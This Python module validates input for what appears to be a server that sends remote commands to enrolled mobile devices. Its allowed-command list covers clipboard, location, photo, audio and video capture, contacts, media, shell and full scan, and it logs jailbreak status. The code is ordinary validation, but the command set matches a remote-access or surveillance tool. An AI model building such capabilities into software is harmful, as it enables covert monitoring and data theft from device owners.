"""
Input Validation Middleware
Sanitizes and validates user input
"""

import re
from typing import Any, Dict, Optional
from app.utils import logger


def sanitize_string(value: str, max_length: int = 500) -> str:
    """Remove potentially dangerous characters from string"""
    
    if not isinstance(value, str):
        return str(value)[:max_length]
    
    # Remove null bytes
    value = value.replace('\x00', '')
    
    # Truncate to max length
    return value[:max_length]


def validate_device_id(device_id: str) -> bool:
    """
    Validate device ID format
    Expected: UUID format or alphanumeric with dashes
    """
    
    if not device_id:
        return False
    
    # UUID pattern
    uuid_pattern = r'^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$'
    
    # Alphanumeric with dashes (fallback)
    simple_pattern = r'^[a-zA-Z0-9\-_]{1,100}$'
    
    return bool(re.match(uuid_pattern, device_id) or re.match(simple_pattern, device_id))


def validate_command(command: str) -> bool:
    """Validate command name"""
    
    allowed_commands = {
        'clipboard', 'system_info', 'location', 'capture_photo',
        'record_audio', 'record_video', 'contacts', 'media', 'shell',
        'identify', 'ping', 'full_scan'
    }
    
    return command in allowed_commands


def validate_auth_request(data: Dict) -> tuple[bool, Optional[str]]:
    """
    Validate authentication request data
    
    Returns:
        (is_valid, error_message)
    """
    
    if not data:
        return False, "Request body is required"
    
    device_id = data.get('device_id')
    secret = data.get('secret')
    
    if not device_id:
        return False, "device_id is required"
    
    if not secret:
        return False, "secret is required"
    
    if not validate_device_id(device_id):
        logger.warning(f"[VALIDATION] Invalid device_id format: {device_id[:50]}")
        return False, "Invalid device_id format"
    
    return True, None


def validate_identify_data(data: Dict) -> Dict:
    """Sanitize identify event data"""
    
    sanitized = {}
    
    # Required fields
    sanitized['device_id'] = sanitize_string(data.get('device_id', ''), 100)
    
    # Optional fields
    sanitized['device_name'] = sanitize_string(data.get('device_name', ''), 100)
    sanitized['system_name'] = sanitize_string(data.get('system_name', ''), 50)
    sanitized['system_version'] = sanitize_string(data.get('system_version', ''), 20)
    sanitized['model'] = sanitize_string(data.get('model', ''), 50)
    sanitized['app_version'] = sanitize_string(data.get('app_version', ''), 20)
    
    # Boolean fields
    sanitized['is_jailbroken'] = bool(data.get('is_jailbroken', False))
    
    # Integer fields
    try:
        sanitized['battery_level'] = int(data.get('battery_level', -1))
    except (ValueError, TypeError):
        sanitized['battery_level'] = -1
    
    return sanitized
